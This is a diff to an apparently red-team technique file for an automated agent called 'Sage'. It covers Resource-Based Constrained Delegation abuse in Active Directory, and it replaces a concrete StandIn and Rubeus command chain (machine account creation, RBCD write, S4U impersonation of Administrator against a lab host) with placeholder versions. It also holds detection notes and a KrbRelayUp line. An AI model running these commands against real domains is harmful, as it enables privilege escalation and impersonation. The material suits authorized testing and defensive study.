@@ -23,8 +23,10 @@ detection_signal: |
   to a service. MDI has S4U abuse detection. The combination of events in a tight window
   is a strong RBCD attack signature.
 usage_examples:
-  - description: Full RBCD chain — setup (StandIn) + exploit (Rubeus)
-    args: "# 1. Create machine account:\nStandIn.exe --computer mypc01 --password 'P@ssw0rd1!'\n# 2. Write RBCD:\nStandIn.exe --rbcd --computer mypc01 --target VICTIM$\n# 3. Get TGT for machine account:\nRubeus.exe asktgt /user:mypc01$ /password:'P@ssw0rd1!' /domain:north.sevenkingdoms.local /nowrap\n# 4. S4U chain:\nRubeus.exe s4u /ticket:<TGT> /impersonateuser:Administrator /msdsspn:cifs/VICTIM.north.sevenkingdoms.local /ptt"
+  - description: Generic RBCD setup for an independently selected controlled and target computer
+    args: 'StandIn.exe --rbcd --computer <ATTACKER_MACHINE> --target <TARGET_COMPUTER>'
+  - description: Generic S4U use after the RBCD write has been verified
+    args: 'Rubeus.exe s4u /ticket:<TGT> /impersonateuser:<PROTECTED_ACCOUNT> /msdsspn:cifs/<TARGET_COMPUTER> /ptt'
 opsec_notes: |
   This is a TECHNIQUE SUMMARY that ties together StandIn (RBCD setup) and Rubeus (S4U
   exploitation). The individual OPSEC notes are in standin.md and rubeus.md. The combined
@@ -33,9 +35,9 @@ opsec_notes: |
   LDAP write by using Kerberos relay.
 gotchas: |
   Machine account quota (ms-DS-MachineAccountQuota, default 10) must be > 0. The
-  exploiting machine account (mypc01$) needs an SPN for S4U2self — newly created machine
+  exploiting machine account needs an SPN for S4U2self — newly created machine
   accounts auto-generate HOST and restrictedkerberos SPNs. The S4U2proxy target SPN must
-  be accessible from the domain (verify CIFS/SMB is accessible on VICTIM). RBCD requires
+  be accessible from the domain (verify the objective-scoped service is accessible on the target). RBCD requires
   Windows Server 2012 R2+ functional level.
 related_ttps: [standin, rubeus, krbrelay, sharpkrbrelay, krbrelayup, whisker]
 alternatives: [krbrelayup-auto, krbrelay-auto, whisker-shadow-cred-path]
@@ -52,18 +54,15 @@ the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of a computer object, t
 create or designate an account as the front-end service and then use S4U2self + S4U2proxy
 to obtain service tickets impersonating any domain user to that computer.
 
-## The RBCD Attack Chain
+## Generic RBCD mechanics
 
 ```
-Prerequisite: Write rights on msDS-AllowedToActOnBehalfOfOtherIdentity on VICTIM$
+Prerequisite: Write rights on msDS-AllowedToActOnBehalfOfOtherIdentity on <TARGET_COMPUTER>
               (from GenericWrite, GenericAll, WriteDACL, or RBCD-write ACE)
 
-1. Create attacker-controlled machine account: StandIn --computer mypc01 --password X
-2. Write RBCD: StandIn --rbcd --computer mypc01 --target VICTIM$
-3. Request TGT for mypc01$: Rubeus asktgt /user:mypc01$ /password:X
-4. S4U chain: Rubeus s4u /ticket:<TGT> /impersonateuser:Administrator
-             /msdsspn:cifs/VICTIM.DOMAIN /ptt
-5. Access VICTIM as Administrator
+Create or select <ATTACKER_MACHINE>, write its SID to <TARGET_COMPUTER>, and verify the attribute
+readback. Then obtain that machine's TGT and use S4U2self/S4U2proxy for the objective-scoped
+<PROTECTED_ACCOUNT> and service SPN. Keep each action bound to the same target realm.
 ```
 
 ## Local RBCD (no external LDAP write)
@@ -81,7 +80,7 @@ KrbRelayUp.exe full -m rbcd --auto
 - Local privilege escalation (KrbRelayUp/SharpKrbRelay variant)
 - Domain-level escalation when a controlled principal has RBCD write rights
 
-## How Sage uses this
-Sage identifies RBCD opportunities from SharpHound BloodHound data (GenericWrite edges
-to computer objects) and from KrbRelayUp for local escalation. The chain uses StandIn
-for RBCD setup and Rubeus for S4U exploitation, or KrbRelayUp for the automated local path.
+## Selection and verification
+Select RBCD only from observed ACL evidence on the target computer object. Verify the machine-account
+creation or existing account control, the delegation-attribute readback, and the resulting service ticket.
+Clean up created accounts and delegation attributes when the operation permits it.
